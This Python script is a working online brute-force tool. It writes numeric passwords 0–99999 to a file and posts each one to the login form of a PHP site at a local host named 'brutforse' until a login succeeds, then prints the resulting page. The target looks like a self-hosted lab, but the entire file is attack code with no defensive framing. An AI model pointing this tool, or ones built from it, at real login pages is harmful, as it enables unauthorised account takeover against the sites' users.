import os
import requests
import time
from bs4 import BeautifulSoup


def CreatePasswords():
    f = open("pswd.txt", "w")
    for i in range(0, 100000):
        f.write(str(i) + "\n")

class Bruteforcer:
    ROOT = "http://brutforse/"
    ResText = None

    def Force(self, name, filename):
        START = time.time()
        f = open(filename, "r")
        j=0
        for password in f:

            password = password.replace("\n", "")
            if j==0:
                os.system( 'clear')
                print("W8 a bit.")
            elif j==30:
                os.system( 'clear')
                print("W8 a bit..")
            elif j==60:
                os.system( 'clear')
                print("W8 a bit...")
                j=-30
            j+=1
           
            self.auth(name, password)
            if self.ResText is not None:
                FINISH = time.time()
                os.system( 'clear')
                return FINISH - START
        return -1

    def auth(self, user_name, password):

        session = requests.Session()
        url = self.ROOT + "index.php"
        params = {'btn_log': '1', "input_name": user_name, "input_password": password}
        try:
            r = session.post(url, params)
        except requests.exceptions.ConnectionError:
            pass
        if r.url != "http://brutforse/index.php":
            soup = BeautifulSoup(r.text, 'html.parser')
            self.ResText = soup.p.get_text()

    def SignUp(self, user_name, password):
        session = requests.Session()
        url = self.ROOT + "register.php"
        params = {'btn log': '1', "input name": user_name, "input password": password}
        session.post(url, params)

def run():
    forcer = Bruteforcer()
    key = None

    CreatePasswords()

    while key != "q":
        print(
            "1 - Brute pwd\n"
            "q - Exit.")
        key = input()
        if key == '1':
            name = input("Enter username: ")
            t = forcer.Force(name, "pswd.txt")

            if forcer.ResText is not None:
                print("Success!\nTime spent on bru73: ", t, "\n")
                print(forcer.ResText)
            else:
                print("\nPassword not found :(")


run()